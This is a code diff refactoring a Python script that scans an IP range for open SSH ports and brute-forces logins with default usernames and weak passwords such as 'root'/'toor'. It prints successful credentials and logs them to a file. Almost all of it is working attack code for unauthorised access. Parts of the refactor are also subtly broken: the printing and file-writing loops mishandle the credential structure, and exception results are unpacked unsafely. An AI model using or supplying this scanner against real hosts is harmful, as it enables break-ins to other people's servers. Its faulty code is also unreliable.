@@ -28,12 +28,10 @@ async def check_port(ip_address, port):
 
 async def scan_ips(ip_range, port):
     loop = asyncio.get_event_loop()
-    tasks = []
-    for i in ip_range:
-        tasks.append(loop.create_task(check_port(i, port)))
+    tasks = [loop.create_task(check_port(i, port)) for i in ip_range]
 
     results = await asyncio.gather(*tasks, return_exceptions=True)
-    live_ips = [x for x in results if x is not None]
+    live_ips = [ip for ip in results if ip is not None]
     return live_ips
 
 async def try_ssh(ip_address, username, password):
@@ -48,48 +46,49 @@ async def try_ssh(ip_address, username, password):
 async def scan_ssh(ip_address):
     loop = asyncio.get_event_loop()
     usernames = ['root', 'admin', 'ubuntu','kali']
-    passwords = ['password', '123456', 'admin', 'toor', 'qwerty']
-    tasks = []
-    for user in usernames:
-        for password in passwords:
-            tasks.append(loop.create_task(try_ssh(ip_address, user, password)))
+    passwords = ['password', 'kali', '123456', 'admin', 'toor', 'qwerty']
+    tasks = [loop.create_task(try_ssh(ip_address, user, password)) for user in usernames for password in passwords]
 
     results = await asyncio.gather(*tasks, return_exceptions=True)
-    credentials = [x for x in results if x[0] is not None]
+    credentials = [(user, password) for user, password in results if user is not None]
     return credentials
 
-async def main():
-    while True:
-        ip_range = input("Please enter the IP range to be scanned: ")
-        try:
-            ip_network = ipaddress.ip_network(ip_range)
-            break
-        except ValueError:
-            print("Invalid IP range format. Please try again.")
-
-    port = 22
-    live_ips = await scan_ips(list(ip_network.hosts()), port)
-
-    credentials = []
-    for ip in live_ips:
-        credentials.extend(await scan_ssh(ip))
-
-    # Print as a neat and colorful table:
+def print_results_table(credentials):
     table = Table(title="SSH Credentials")
     table.add_column("IP Address", justify="center", style="cyan", no_wrap=True)
     table.add_column("Username", justify="center", style="purple")
     table.add_column("Password", justify="center", style="green")
 
-    for credential in credentials:
+    for ip, credential in credentials.items():
         table.add_row(f"[bold]{ip}[/bold]", credential[0], credential[1])
         log.info(f"{ip}: Username={credential[0]}, Password={credential[1]}")
 
     console.print(table)
 
-    # Write to text file:
+def write_to_file(credentials):
     with open("successful_logins.txt", "a") as f:
-        for credential in credentials:
+        for ip, credential in credentials.items():
             f.write(f"{ip}\t{credential[0]}\t{credential[1]}\n")
+
+async def main():
+    while True:
+        ip_range = input("Please enter the IP range to be scanned: ")
+        try:
+            parsed_ip_range = ipaddress.ip_network(ip_range)
+            ip_list = list(parsed_ip_range.hosts())
+            break
+        except ipaddress.AddressValueError:
+            print("Invalid IP range format. Please try again.")
+
+    port = 22
+    live_ips = await scan_ips(ip_list, port)
+
+    credentials = {}
+    for ip in live_ips:
+        credentials[ip] = await scan_ssh(ip)
+
+    print_results_table(credentials)
+    write_to_file(credentials)
 
 if __name__ == '__main__':
     asyncio.run(main())
